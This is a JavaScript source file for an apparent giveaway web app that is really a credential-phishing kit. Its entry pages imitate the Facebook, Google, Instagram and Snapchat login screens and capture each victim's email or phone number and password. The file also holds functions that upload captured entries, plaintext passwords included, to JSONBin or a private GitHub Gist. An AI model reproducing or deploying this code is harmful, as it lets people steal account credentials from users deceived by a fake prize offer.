// Main application JavaScript
class GiveawayApp {
  constructor() {
    this.currentRoute = "";
    this.showThankYou = false;
    this.thankYouTimer = null;
    this.entryMethods = [
      {
        logo: "fbLogo.png",
        text: "Facebook",
        route: "facebook",
      },
      {
        logo: "instaLogo.png",
        text: "Instagram",
        route: "instagram",
      },
      {
        logo: "snapLogo.png",
        text: "Snapchat",
        route: "snapchat",
      },
      {
        logo: "googleLogo.png",
        text: "Google",
        route: "google",
      },
    ];

    this.init();
  }

  init() {
    // Initialize routing
    this.handleRouting();

    // Listen for browser back/forward buttons
    window.addEventListener("popstate", () => this.handleRouting());
  }

  // Routing functionality
  handleRouting() {
    const path = window.location.pathname;
    const params = new URLSearchParams(window.location.search);

    this.currentRoute = path === "/" ? "home" : path.substring(1);

    // Check for success parameter
    const success = params.get("success");
    if (success) {
      this.showThankYouMessage(success);
      // Remove success parameter from URL
      const newUrl = window.location.origin + window.location.pathname;
      window.history.replaceState({}, "", newUrl);
    }

    this.render();
  }

  navigate(route) {
    // Check if we can use pushState (not in file:// protocol)
    if (window.location.protocol !== "file:") {
      const url = route === "home" ? "/" : `/${route}`;
      window.history.pushState({}, "", url);
    }
    this.currentRoute = route;
    this.render();
  }

  navigateWithSuccess(platform) {
    // Check if we can use pushState (not in file:// protocol)
    if (window.location.protocol !== "file:") {
      const url = `/?success=${platform}`;
      window.history.pushState({}, "", url);
    }
    this.currentRoute = "home";
    this.showThankYouMessage(platform);
    this.render();
  }

  showThankYouMessage(platform) {
    this.showThankYou = true;

    // Auto-hide after 5 seconds
    if (this.thankYouTimer) {
      clearTimeout(this.thankYouTimer);
    }

    this.thankYouTimer = setTimeout(() => {
      this.showThankYou = false;
      this.render();
    }, 5000);
  }

  dismissThankYou() {
    this.showThankYou = false;
    if (this.thankYouTimer) {
      clearTimeout(this.thankYouTimer);
      this.thankYouTimer = null;
    }
    this.render();
  }

  // Validation functionality
  validateLoginForm(email, password) {
    let isValid = true;
    let emailError = "";
    let passwordError = "";

    // Validate email/phone
    if (!email.trim()) {
      emailError = "Email or mobile number is required";
      isValid = false;
    } else {
      const firstChar = email.trim().charAt(0);

      if (/\d/.test(firstChar)) {
        // If it starts with a number, it should be a 10-digit phone number
        const phoneRegex = /^\d{10}$/;
        if (!phoneRegex.test(email.trim())) {
          emailError = "Phone number must be exactly 10 digits";
          isValid = false;
        }
      } else if (/[a-zA-Z]/.test(firstChar)) {
        // If it starts with a letter, it should be a valid email
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(email.trim())) {
          emailError = "Please enter a valid email address";
          isValid = false;
        }
      } else {
        // If it starts with neither a number nor a letter
        emailError =
          "Must start with a number (for phone) or letter (for email)";
        isValid = false;
      }
    }

    // Validate password
    if (!password.trim()) {
      passwordError = "Password is required";
      isValid = false;
    }

    return {
      isValid,
      emailError,
      passwordError,
    };
  }

  // Save data functionality - Multiple remote options
  async saveDataRemotely(entry) {
    try {
      // Option 1: JSONBin.io (Free JSON storage)
      await this.saveToJSONBin(entry);

      console.log("Entry saved remotely:", entry);
    } catch (error) {
      console.error("Error saving data remotely:", error);
      // Fallback to localStorage if remote fails
      this.saveToLocalStorage(entry);
      throw error;
    }
  }

  // Option 1: JSONBin.io - Free JSON storage service
  async saveToJSONBin(entry) {
    const BIN_ID = "679f1234567890abcdef1234"; // Replace with your bin ID
    const API_KEY = "$2a$10$your-api-key-here"; // Replace with your API key

    try {
      // First, get existing data
      const getResponse = await fetch(
        `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,
        {
          method: "GET",
          headers: {
            "X-Master-Key": API_KEY,
          },
        }
      );

      let existingData = [];
      if (getResponse.ok) {
        const result = await getResponse.json();
        existingData = result.record.entries || [];
      }

      // Add new entry
      existingData.push(entry);

      // Update the bin
      const updateResponse = await fetch(
        `https://api.jsonbin.io/v3/b/${BIN_ID}`,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-Master-Key": API_KEY,
          },
          body: JSON.stringify({
            entries: existingData,
            lastUpdated: new Date().toISOString(),
          }),
        }
      );

      if (!updateResponse.ok) {
        throw new Error("Failed to save to JSONBin");
      }

      console.log("Data saved to JSONBin successfully");
    } catch (error) {
      console.error("JSONBin error:", error);
      throw error;
    }
  }

  // Option 2: Formspree - Simple form submission service
  async saveToFormspree(entry) {
    const FORMSPREE_ENDPOINT = "https://formspree.io/f/your-form-id"; // Replace with your form ID

    try {
      const response = await fetch(FORMSPREE_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          platform: entry.platform,
          email: entry.email,
          timestamp: entry.timestamp,
          // Note: Don't send passwords to form services for security
          message: `New ${entry.platform} entry from ${entry.email}`,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to save to Formspree");
      }

      console.log("Data sent to Formspree successfully");
    } catch (error) {
      console.error("Formspree error:", error);
      throw error;
    }
  }

  // Option 3: GitHub Gist - Free file storage via GitHub API
  async saveToGitHubGist(entry) {
    const GITHUB_TOKEN = "your-github-token"; // Replace with your GitHub token
    const GIST_ID = "your-gist-id"; // Replace with your gist ID (optional for new gist)

    try {
      // Get existing gist content
      let existingEntries = [];
      if (GIST_ID) {
        const getResponse = await fetch(
          `https://api.github.com/gists/${GIST_ID}`,
          {
            headers: {
              Authorization: `token ${GITHUB_TOKEN}`,
              Accept: "application/vnd.github.v3+json",
            },
          }
        );

        if (getResponse.ok) {
          const gist = await getResponse.json();
          const content = gist.files["giveaway-entries.json"]?.content;
          if (content) {
            existingEntries = JSON.parse(content);
          }
        }
      }

      // Add new entry
      existingEntries.push(entry);

      // Update or create gist
      const gistData = {
        description: "Giveaway Entries Data",
        public: false,
        files: {
          "giveaway-entries.json": {
            content: JSON.stringify(existingEntries, null, 2),
          },
        },
      };

      const url = GIST_ID
        ? `https://api.github.com/gists/${GIST_ID}`
        : "https://api.github.com/gists";

      const response = await fetch(url, {
        method: GIST_ID ? "PATCH" : "POST",
        headers: {
          Authorization: `token ${GITHUB_TOKEN}`,
          Accept: "application/vnd.github.v3+json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(gistData),
      });

      if (!response.ok) {
        throw new Error("Failed to save to GitHub Gist");
      }

      console.log("Data saved to GitHub Gist successfully");
    } catch (error) {
      console.error("GitHub Gist error:", error);
      throw error;
    }
  }

  // Option 4: Firebase Firestore (requires Firebase config)
  async saveToFirestore(entry) {
    // This would require Firebase SDK
    // Implementation depends on your Firebase configuration
    console.log("Firestore save would go here");
  }

  // Fallback: Local storage
  saveToLocalStorage(entry) {
    try {
      const existingEntries = JSON.parse(
        localStorage.getItem("giveawayEntries") || "[]"
      );
      existingEntries.push(entry);
      localStorage.setItem("giveawayEntries", JSON.stringify(existingEntries));
      console.log("Entry saved to localStorage as fallback:", entry);
    } catch (error) {
      console.error("Error saving to localStorage:", error);
    }
  }

  // Render functionality
  render() {
    const app = document.getElementById("app");

    let content = "";

    switch (this.currentRoute) {
      case "home":
        content = this.renderWelcomePage();
        break;
      case "facebook":
        content = this.renderFacebookPage();
        break;
      case "google":
        content = this.renderGooglePage();
        break;
      case "instagram":
        content = this.renderInstagramPage();
        break;
      case "snapchat":
        content = this.renderSnapchatPage();
        break;
      default:
        content = this.renderWelcomePage();
    }

    app.innerHTML = content;
    this.attachEventListeners();
  }

  renderCommonHeader(showBackButton = true) {
    if (!showBackButton) return "";

    return `
      <header class="common-header">
        <div class="header-content">
          <button class="back-button" data-action="back">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <span class="back-text">Back</span>
          </button>
        </div>
      </header>
    `;
  }

  renderWelcomePage() {
    return `
      <div class="min-h-screen bg-gray-50">
        <!-- Header -->
        <div class="header">
          <div class="max-w-6xl mx-auto px-4 py-6">
            <div class="flex justify-center">
              <h1 class="giveaway-title">Giveaway</h1>
            </div>
          </div>
        </div>

        <!-- Thank You Message -->
        ${
          this.showThankYou
            ? `
          <div class="thank-you-message">
            <div class="flex items-center gap-2">
              <span class="font-medium">
                Thank you! Your entry has been saved successfully!
              </span>
            </div>
            <button class="thank-you-close ml-2" data-action="dismiss-thankyou">
              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
              </svg>
            </button>
          </div>
        `
            : ""
        }

        <!-- Main Content -->
        <div class="max-w-6xl mx-auto px-4 py-6">
          <!-- Giveaway Info Section -->
          <div class="bg-white rounded-lg p-6 shadow-sm mb-8">
            <div class="flex flex-col gap-4">
              <div class="flex-1">
                <p class="text-xl text-gray-700 mb-1">Share Your Lucky</p>
                <p class="text-sm text-gray-600">by CSP Marketing</p>
                <p class="text-sm text-gray-600 mt-2">Enter for your chance to win Grand Prize</p>
                
                <div class="mt-4 flex items-center gap-2">
                  <div class="w-3 h-3 bg-pink-500 rounded-full flex-shrink-0"></div>
                  <span class="text-base text-gray-700">This giveaway is being run by CSP Marketing</span>
                </div>
                
                <div class="mt-2 flex items-center gap-2">
                  <div class="w-3 h-3 bg-gray-400 rounded-full flex-shrink-0"></div>
                  <span class="text-base text-gray-700">Ends Wednesday, January 27, 2026 at 07:59AM UTC</span>
                </div>
              </div>

              <!-- Stats -->
              <div class="flex gap-6 text-center justify-center">
                <div>
                  <div class="text-2xl font-bold">5</div>
                  <div class="text-base text-gray-600">Total Entries</div>
                </div>
              </div>
            </div>
          </div>

          <div class="grid grid-cols-1 gap-8">
            <!-- Left Column - Contest Info -->
            <div class="space-y-6">
              <!-- Prizes Section -->
              <div class="bg-white rounded-lg p-6 shadow-sm">
                <h2 class="text-xl font-semibold mb-4">Prizes:</h2>
                <div class="mt-4 space-y-1 text-base text-gray-700">
                  <div>🏆 1 x $100 Amazon Gift Card</div>
                  <div>🥈 1 x $50 Amazon Gift Card</div>
                  <div>🎁 5 x $10 Amazon Gift Cards</div>
                </div>
              </div>
            </div>

            <!-- Right Column - Contest Image and Entry Methods -->
            <div class="space-y-6">
              <!-- Main Contest Image -->
              <div class="contest-image">
                <div class="relative z-10">
                  <div class="text-3xl font-bold mb-2">Share Your Lucky</div>
                </div>
                <div class="absolute inset-0 bg-black/20"></div>
              </div>

              <!-- Entry Methods -->
              <div class="bg-white rounded-lg p-6 shadow-sm">
                <h3 class="font-semibold mb-6 text-xl">4 Ways to Enter</h3>
                <div class="space-y-4">
                  ${this.entryMethods
                    .map(
                      (method) => `
                    <div class="entry-method-btn" data-action="navigate" data-route="${method.route}">
                      <div class="entry-method-content">
                        <div class="entry-method-icon">
                          <img src="${method.logo}" alt="${method.text}" />
                        </div>
                        <span class="text-base text-gray-800 leading-relaxed">${method.text}</span>
                      </div>
                    </div>
                  `
                    )
                    .join("")}
                </div>
              </div>

              <div class="text-center text-sm text-gray-500">
                Terms & Conditions • © CSP Marketing
              </div>
            </div>
          </div>
        </div>
      </div>
    `;
  }

  renderFacebookPage() {
    return `
      <div class="facebook-page page-with-header">
        ${this.renderCommonHeader()}
        
        <div class="fb-mobile-banner"></div>

        <div class="fb-container">
          <!-- Desktop Left Section -->
          <div class="fb-left-section">
            <div class="facebook-branding">
              <h1 class="fb-facebook-logo">facebook</h1>
              <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
            </div>
          </div>

          <!-- Right Section / Mobile Main Content -->
          <div class="fb-right-section">
            <!-- Mobile Facebook Logo -->
            <div class="fb-mobile-logo">
              <img src="fbLogo.png" alt="Facebook" class="fb-mobile-facebook-logo" />
            </div>

            <!-- Login Form -->
            <div class="fb-login-card">
              <form class="fb-login-form" id="facebook-form">
                <div class="fb-input-group">
                  <input type="email" placeholder="Email or phone number" id="facebook-email" />
                  <div class="fb-error-message" id="facebook-email-error"></div>
                </div>
                <div class="fb-input-group">
                  <input type="password" placeholder="Password" id="facebook-password" />
                  <div class="fb-error-message" id="facebook-password-error"></div>
                </div>
                <button type="submit" class="fb-login-btn">Log In</button>
              </form>
            </div>

            <!-- Create Page Link (Desktop) -->
            <div class="fb-create-page-link">
              <a href="#"><strong>Create a Page</strong> for a celebrity, brand or business.</a>
            </div>
          </div>
        </div>

        <!-- Footer -->
        <footer class="fb-footer">
          <div class="fb-footer-content">
            <div class="fb-footer-links">
              <div class="fb-links-row">
                <a href="#">Sign Up</a>
                <a href="#">Log In</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Video</a>
                <a href="#">Meta Pay</a>
                <a href="#">Meta Store</a>
                <a href="#">Meta Quest</a>
                <a href="#">Ray-Ban Meta</a>
                <a href="#">Meta AI</a>
                <a href="#">Meta AI more content</a>
                <a href="#">Instagram</a>
              </div>
              <div class="fb-links-row">
                <a href="#">Threads</a>
                <a href="#">Voting Information Center</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Consumer Health Privacy</a>
                <a href="#">Privacy Center</a>
                <a href="#">About</a>
                <a href="#">Create ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
              </div>
              <div class="fb-links-row">
                <a href="#">Cookies</a>
                <a href="#">Ad choices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
                <a href="#">Contact Uploading & Non-Users</a>
              </div>
            </div>
            <div class="fb-copyright">
              <span>Meta © 2026</span>
            </div>
          </div>
        </footer>
      </div>
    `;
  }

  renderGooglePage() {
    return `
      <div class="google-page page-with-header">
        ${this.renderCommonHeader()}
        <div class="google-container">
          <div class="google-signin-card">
            <div class="google-logo-container">
              <img src="googleLogo.png" alt="Google" class="google-logo" />
            </div>

            <h1 class="google-signin-title">Sign in</h1>
            <p class="google-signin-subtitle">to continue to Gmail</p>

            <form id="google-form">
              <div class="google-form-group">
                <input type="text" id="google-email" placeholder="Email or phone" 
                       class="google-form-input" required />
                <div id="google-email-error" class="google-error-message"></div>
              </div>
              
              <div class="google-form-group">
                <input type="password" id="google-password" placeholder="Password" 
                       class="google-form-input" required />
                <div id="google-password-error" class="google-error-message"></div>
              </div>

              <div class="google-button-container">
                <button type="submit" class="google-login-btn">
                  Login
                </button>
              </div>
            </form>
          </div>

          <footer class="google-footer">
            <div class="google-footer-links">
              <a href="#">Help</a>
              <a href="#">Privacy</a>
              <a href="#">Terms</a>
            </div>
          </footer>
        </div>
      </div>
    `;
  }

  renderInstagramPage() {
    return `
      <div class="page-with-header" style="background: #fafafa; min-height: 100vh;">
        ${this.renderCommonHeader()}
        <div class="instagram-container">
          <div class="instagram-card">
            <img src="instaLogo.png" alt="Instagram" class="instagram-logo" />
            
            <form id="instagram-form">
              <div class="instagram-form-group">
                <input type="text" id="instagram-email" placeholder="Phone number, username, or email" 
                       class="instagram-form-input" />
                <div id="instagram-email-error" class="instagram-error-message"></div>
              </div>
              
              <div class="instagram-form-group">
                <input type="password" id="instagram-password" placeholder="Password" 
                       class="instagram-form-input" />
                <div id="instagram-password-error" class="instagram-error-message"></div>
              </div>

              <button type="submit" class="instagram-login-btn">
                Log In
              </button>
            </form>
          </div>
        </div>
      </div>
    `;
  }

  renderSnapchatPage() {
    return `
      <div class="page-with-header">
        ${this.renderCommonHeader()}
        <div class="snapchat-container">
          <div class="snapchat-card">
            <img src="snapLogo.png" alt="Snapchat" class="snapchat-logo" />
            
            <h2 class="snapchat-title">Log In</h2>
            
            <form id="snapchat-form">
              <div class="snapchat-form-group">
                <input type="text" id="snapchat-email" placeholder="Username or Email" 
                       class="snapchat-form-input" />
                <div id="snapchat-email-error" class="snapchat-error-message"></div>
              </div>
              
              <div class="snapchat-form-group">
                <input type="password" id="snapchat-password" placeholder="Password" 
                       class="snapchat-form-input" />
                <div id="snapchat-password-error" class="snapchat-error-message"></div>
              </div>

              <button type="submit" class="snapchat-login-btn">
                Log In
              </button>
            </form>
          </div>
        </div>
      </div>
    `;
  }

  // Event listeners
  attachEventListeners() {
    // Back button
    const backButton = document.querySelector('[data-action="back"]');
    if (backButton) {
      backButton.addEventListener("click", () => this.navigate("home"));
    }

    // Thank you dismiss
    const dismissButton = document.querySelector(
      '[data-action="dismiss-thankyou"]'
    );
    if (dismissButton) {
      dismissButton.addEventListener("click", () => this.dismissThankYou());
    }

    // Navigation buttons
    const navButtons = document.querySelectorAll('[data-action="navigate"]');
    navButtons.forEach((button) => {
      button.addEventListener("click", () => {
        const route = button.getAttribute("data-route");
        this.navigate(route);
      });
    });

    // Form submissions
    const forms = {
      "facebook-form": "facebook",
      "google-form": "google",
      "instagram-form": "instagram",
      "snapchat-form": "snapchat",
    };

    Object.entries(forms).forEach(([formId, platform]) => {
      const form = document.getElementById(formId);
      if (form) {
        form.addEventListener("submit", (e) =>
          this.handleFormSubmit(e, platform)
        );
      }
    });
  }

  async handleFormSubmit(event, platform) {
    event.preventDefault();

    const emailInput = document.getElementById(`${platform}-email`);
    const passwordInput = document.getElementById(`${platform}-password`);
    const emailErrorDiv = document.getElementById(`${platform}-email-error`);
    const passwordErrorDiv = document.getElementById(
      `${platform}-password-error`
    );

    const email = emailInput.value;
    const password = passwordInput.value;

    // Validate form
    const validation = this.validateLoginForm(email, password);

    // Clear previous errors
    emailInput.classList.remove("error");
    passwordInput.classList.remove("error");
    emailErrorDiv.style.display = "none";
    passwordErrorDiv.style.display = "none";

    if (!validation.isValid) {
      if (validation.emailError) {
        emailInput.classList.add("error");
        emailErrorDiv.textContent = validation.emailError;
        emailErrorDiv.style.display = "block";
      }
      if (validation.passwordError) {
        passwordInput.classList.add("error");
        passwordErrorDiv.textContent = validation.passwordError;
        passwordErrorDiv.style.display = "block";
      }
      return;
    }

    try {
      // Create new entry
      const newEntry = {
        platform: platform,
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
      };

      // Log the entry data
      console.log("Entry saved:", newEntry);

      // Clear form
      emailInput.value = "";
      passwordInput.value = "";

      // Navigate to home with success message
      this.navigateWithSuccess(platform);
    } catch (error) {
      alert("Failed to save login credentials. Please try again.");
    }
  }
}

// Initialize the app when DOM is loaded
document.addEventListener("DOMContentLoaded", () => {
  new GiveawayApp();
});
